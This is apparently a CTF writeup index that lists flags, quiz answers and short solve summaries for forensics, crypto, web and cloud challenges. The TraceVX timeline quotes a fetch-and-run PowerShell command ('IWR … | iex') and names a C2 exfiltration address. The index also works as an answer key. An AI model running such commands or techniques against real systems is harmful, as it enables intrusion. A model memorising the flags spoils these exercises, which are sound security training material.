# CTF Writeup Index — `Documents/ctf`

Master documentation of every writeup in this directory.

**Totals:** 18 unique challenges — 3 TVX CTF (archived) + 10 InIt CTF +
5 NexPloit CTF (all solved).

| Event | Flag format | Location |
|-------|-------------|----------|
| TVX CTF (archived) | `TVX{...}` / `Tvx{...}` | [`TVX-CTF/`](TVX-CTF/README.md) |
| Live session 2026-11-14 | `InIt{...}` | [`InIt-CTF/`](InIt-CTF/README.md) |
| NexPloit CTF | `nex{...}` / `NEX{...}` / `flag{...}` | [`Nexploit-CTF/`](Nexploit-CTF/README.md) |

---

## Index — Live session 2026-11-14 (`InIt{}`)

Full session index with per-challenge writeups:
[`InIt-CTF/README.md`](InIt-CTF/README.md)

| # | Challenge | Category | Points | Flag | Writeup |
|---|-----------|----------|--------|------|---------|
| 1 | The Midnight Key | Crypto (classical) | — | `InIt{v1g3n3r3_w4s_n0t_th3_4nsw3r}` | [InIt-CTF/midnight-vigenere](InIt-CTF/midnight-vigenere/writeup.md) |
| 2 | Tanvoro Deleted Evidence | Forensics (NTFS) | — | `InIt{d3l3t3d_but_n0t_g0n3}` | [InIt-CTF/deleted-evidence](InIt-CTF/deleted-evidence/writeup.md) |
| 3 | Secure Notes (Android) | Forensics (mobile) | — | `InIt{s3cur3_n0t3s_n0t_s0_s3cur3}` | [InIt-CTF/secure-notes](InIt-CTF/secure-notes/writeup.md) |
| 4 | EC2 IMDS Vault | Forensics (cloud IR) | — | `InIt{imds_k3y3d_s3cr3t_v4ult}` | [InIt-CTF/ec2-imds-vault](InIt-CTF/ec2-imds-vault/writeup.md) |
| 5 | macOS Infostealer PCAP | Forensics (network) | — | `InIt{k3ych4in_crumbs_l34k3d_0v3r_pl41n_http}` | [InIt-CTF/macos-stealer-pcap](InIt-CTF/macos-stealer-pcap/writeup.md) |
| 6 | Super Cookie | Web (Flask forgery) | 100 | `InIt{C00k1e_F0rg3ry_1s_Sup3r}` | [InIt-CTF/super-cookie](InIt-CTF/super-cookie/writeup.md) |
| 7 | Careless Twins | Crypto (RSA shared prime) | — | `InIt{n3v3r_r3us3_pr1m3s_1n_rs4}` | [InIt-CTF/careless-twins](InIt-CTF/careless-twins/writeup.md) |
| 8 | Double-encoded string | Misc / Crypto | — | `InIt{r0t_th3n_b64_1s_n0t_s3cur1ty}` | [InIt-CTF/double-encoded-string](InIt-CTF/double-encoded-string/writeup.md) |
| 9 | Known Plaintext PRNG | Crypto (XOR + LCG) | — | `InIt{kn0wn_pl41nt3xt_4tt4cks_4r3_c00l}` | [InIt-CTF/known-plaintext-prng](InIt-CTF/known-plaintext-prng/writeup.md) |
| 10 | The Troll's Ticket | Misc (file carving) | 200 | `InIt{j0urney_4cr0ss_1ndia}` | [InIt-CTF/trolls-ticket](InIt-CTF/trolls-ticket/writeup.md) |

---

## Index — TVX CTF (archived)

| # | Challenge | Category | Points | Flag | Writeup | Extras |
|---|-----------|----------|--------|------|---------|--------|
| 1 | TraceVX | DFIR (Windows endpoint) | 440 | `TVX{Ahmed@WIN-TRACE-01_TraceTelemetry-185.192.48.239_8MiB_411ff385}` | [TVX-CTF/tracevx](TVX-CTF/tracevx/writeup.md) | AD1 image, netcat quiz service |
| 2 | Ghosty note (GhostNote) | Forensics / DFIR | — | `Tvx{665504d169ef04e47fb9b8f7a9b5bfbe97277dc9}` | [TVX-CTF/ghosty-note](TVX-CTF/ghosty-note/writeup.md) · [reproduce](TVX-CTF/ghosty-note/reproduce/README.md) | `solve.py` reproduces the flag |
| 3 | The Forgotten Tenant | Cloud (AWS / CloudTrail) | — | `TVX{Cl0ud_s3cur1ty}` | [TVX-CTF/the-forgotten-tenant](TVX-CTF/the-forgotten-tenant/writeup.md) | one-shot bash repro in §6 |

---

## Index — NexPloit CTF

| # | Challenge | Category | Points | Flag | Writeup |
|---|-----------|----------|--------|------|---------|
| 1 | Burning Inside | Forensics / Metadata | 100 | `nex{burn1n6_1n51d3}` | [Nexploit-CTF/burning-inside](Nexploit-CTF/burning-inside/writeup.md) |
| 2 | Binary Shadows | Encoding | 200 | `nex{81N4rYD45HC1PH3r}` | [Nexploit-CTF/binary-shadows](Nexploit-CTF/binary-shadows/writeup.md) |
| 3 | 1024 Redirects | Web | 150 | `NEX{th1s_captcha_c0uldnt_tcha}` | [Nexploit-CTF/1024-redirects](Nexploit-CTF/1024-redirects/writeup.md) |
| 4 | Reload | Web / Race condition | 150 | `NEX{w0w_th0se_w3r3_s0me_f4st_r3l04ds}` | [Nexploit-CTF/reload](Nexploit-CTF/reload/writeup.md) |
| 5 | Cookie | Web / Access control | 200 | `flag{hat3l_di_l1k3s_c00ki3s}` | [Nexploit-CTF/cookie](Nexploit-CTF/cookie/writeup.md) |

---

## 1. TraceVX — DFIR (440 pts)

**File:** [`TVX-CTF/tracevx/writeup.md`](TVX-CTF/tracevx/writeup.md)

Windows endpoint compromise on `WIN-TRACE-01`, 2026-09-17. Solved from an
AccessData **AD1** logical image (parsed with `dissect.target` — 7z/dfvfs fail).

**Attack chain reconstructed (all on 2026-09-17 UTC):**

```
14:31:12  Ahmed clicks cutt.ly/ms-portal-login → t2m.io redirect
14:31:51  lands on punycode phish: login-microsoftonline.secure-verify.cc
14:32:18  powershell.exe: IWR <phish>/a | iex   (evidence: crafted .pf)
14:32:20  stage.cmdline staged in %TEMP%\k29x8\  (deleted 7 s later — $MFT/UsnJrnl)
14:32:36  Navigator.exe dropped to C:\ProgramData\Microsoft\UpdateCache\
14:32:40  persistence: scheduled task "TraceTelemetry" (logon trigger, Ahmed)
14:31:51+ exfil 8 MiB outbound to C2 185.192.48.239:443 (SRUDB.sqlite)
```

**Key techniques:** carving two gzip streams from unallocated space in
`disk.img` (benign stream = decoy), XOR key `0x98` derived from C2 octet sum to
decode `url_reputation.bin`, `strings -el` for UTF-16 `$MFT`, SQL SUM over
`network_usage` excluding inbound task-result bytes.

**Decoys to skip:** RFC-5737 C2 IPs (`203.0.113.77`, `198.51.100.44`), ASCII
prefetch files, 8 benign scheduled tasks, second gzip stream ("Acme harmless").

**Ten-question answers:** Ahmed · login-microsoftonline.secure-verify.cc ·
2026-09-17T14:31:51Z · powershell.exe · stage.cmdline · Navigator.exe ·
SHA-256 `411ff385…ab8cd` · TraceTelemetry · 185.192.48.239:443 · 8388608.

---

## 2. Ghosty note — Forensics / DFIR

**Files:** [`TVX-CTF/ghosty-note/writeup.md`](TVX-CTF/ghosty-note/writeup.md) (main),
[`TVX-CTF/ghosty-note/reproduce/`](TVX-CTF/ghosty-note/reproduce/README.md)
(repo copy with `solve.py`, `candidates.py`, disassembly, sources).

Insider exfiltration with **no anomalous cloud logins**: an unsigned
`NotionUpdate.exe --silent-sync` (6.6 KB) runs under the real `Notion.exe`,
reusing the victim's process/token, so the notes leave via the *endpoint*.

**Solve chain (fully reproducible — `python3 solve.py`):**

1. `vault.db` → `identity.deviceSecret` (base64 → exactly 32-byte hash key) and
   `config.serverValidation` (oracle).
2. `NTUSER.DAT.reg` (UTF-16LE) → `HKCU\...\Explorer\SessionInfo\SyncProfile` = `GNT-0926`.
3. Reverse the implant's 12 exports: `decodeServer` = XOR `0x37` → 3 candidate
   C2 URLs; `deriveSession` = `SHA256(key‖host)`; `validationDigest` =
   `SHA256(session‖"GHOSTNOTE")`; `finalFlagDigest` = `SHA256(session‖host‖profile)`.
4. Oracle test picks the real C2: **`sync-notes-service.cloud:8443`**
   (matches Sysmon EID 3 → `104.21.52.117:8443`); the other two hosts fail.
5. Flag = first 40 hex chars of `finalFlagDigest`.

**Decoys:** `vpn_backup.conf` (`some_fake_token`), root-CA comment
("THE IDENTITY OPENS THE DOOR, BUT THE PROFILE NAMES THE CALPAIGN." — actually
the intended hint), two non-validating C2 URLs.

---

## 3. The Forgotten Tenant — Cloud / AWS (Stage 3)

**File:** [`TVX-CTF/the-forgotten-tenant/writeup.md`](TVX-CTF/the-forgotten-tenant/writeup.md)

A forgotten post-migration AWS tenant (account `400875701859`, `us-east-1`).
Two static CloudTrail day-exports + handoff note; the live account holds the flag.

**Puzzle:** the final S3 object key is **split across two days of logs**.
Day 1 gives the case folder `case-ab5396cd`; day 2 (mid log-pipeline migration)
records only the relative sub-path `handoff-RYII91T48V/evidence.json`.
The log even plants two failed reads as decoys (`NoSuchKey` at bucket root,
`AccessDenied` missing the prefix).

**Full key:**
```
s3://tvx-forgotten-tenant-forensics-pro0hid4/case-ab5396cd/handoff-RYII91T48V/evidence.json
```

**Intended access path (role chaining, scripted in writeup §6):**

```
player user → S3 archive bucket (find sts:ExternalId)
           → sts:AssumeRole legacy-migration-role   (needs ExternalId)
           → sts:AssumeRole incident-response-role
           → s3:GetObject stitched key → evidence.json → TVX{Cl0ud_s3cur1ty}
```

**NexPloit CTF:**
```
nex{burn1n6_1n51d3}
nex{81N4rYD45HC1PH3r}
NEX{th1s_captcha_c0uldnt_tcha}
NEX{w0w_th0se_w3r3_s0me_f4st_r3l04ds}
flag{hat3l_di_l1k3s_c00ki3s}
```

**Signals worth remembering:** `AccessDenied` vs `NoSuchKey` distinguishes
"wrong prefix, object exists" from "path doesn't exist"; a failed external
`AssumeRole` leaked the `sts:ExternalId` trust condition; handoff notes are
evidence, not decoration.

---

## Session summary (2026-11-14, `InIt{}`)

Ten challenges were presented in one live session; all ten solved:

1. **Midnight key** — Vigenère with key `midnight` ("the hour when everything
   goes quiet"); validated against the `InIt` known-plaintext prefix.
2. **Tanvoro disk** — `fls` found deleted `recovery_code.gz` (MFT 75); `icat`
   carved it; content was ROT13.
3. **Android Secure Notes** — locked note #4 stored as a gzip blob in SQLite
   TEXT; decompress = bypass. Shared-prefs token was a decoy.
4. **EC2 vault** — key = `SHA256("s4lt_" + instance-id)`; the instance-id was
   printed by cloud-init in the host logs. AES-256-CBC decrypt → flag.
5. **macOS stealer PCAP** — 58 `{"id","part"}` HTTP chunks reassembled to a
   ZIP; flag was a base64 string in the stolen keychain dump's `backup-key`
   entry. Plaintext HTTP betrayed the operators.
6. **Super Cookie** — Flask session signed with `secret123` (rockyou hit);
   forged `{"role":"admin"}`; admin path from `/robots.txt`.
7. **Careless Twins** — both servers reused the same 1024-bit prime `p`;
   `gcd(n1, n2)` factored both moduli instantly. Red herrings: seeded
   `random` and an unused `base` variable. Full batch-GCD attack.
8. **Double-encoded string** — Base64 → ROT13; the `InIt` known prefix reveals
   the ROT13 shift. Two keyless encodings stack to zero security.
9. **Known Plaintext PRNG** — `key0 = ct[:4] XOR b"InIt"` leaks the LCG seed;
   roll the LCG forward block by block to decrypt.
10. **The Troll's Ticket** — four-city zip/tar-after-EOF chain plus a final
   encrypted PDF; each stage's password came from the previous wordlist.

## Repository conventions

* **Per-event directories** (`TVX-CTF/`, `InIt-CTF/`, `Nexploit-CTF/`): one folder
  per challenge containing a template-format `SUMMARY.md` plus the original
  detailed `writeup.md` — full narrative, IoCs, scripts and lessons learned.
* **`TVX-CTF/ghosty-note/reproduce/`**: repo-style mirror ("solutions written
  by Buffy") with solve scripts (`solve.py`, `candidates.py`),
  reverse-engineering notes (`NotionUpdate.disasm.txt`) and harness sources.

### Flags at a glance

**Live session (`InIt{`):**
```
InIt{v1g3n3r3_w4s_n0t_th3_4nsw3r}
InIt{d3l3t3d_but_n0t_g0n3}
InIt{s3cur3_n0t3s_n0t_s0_s3cur3}
InIt{imds_k3y3d_s3cr3t_v4ult}
InIt{k3ych4in_crumbs_l34k3d_0v3r_pl41n_http}
InIt{C00k1e_F0rg3ry_1s_Sup3r}
InIt{n3v3r_r3us3_pr1m3s_1n_rs4}
InIt{r0t_th3n_b64_1s_n0t_s3cur1ty}
InIt{kn0wn_pl41nt3xt_4tt4cks_4r3_c00l}
InIt{j0urney_4cr0ss_1ndia}
```

**TVX CTF (archived):**
```
TVX{Ahmed@WIN-TRACE-01_TraceTelemetry-185.192.48.239_8MiB_411ff385}
Tvx{665504d169ef04e47fb9b8f7a9b5bfbe97277dc9}
TVX{Cl0ud_s3cur1ty}
```
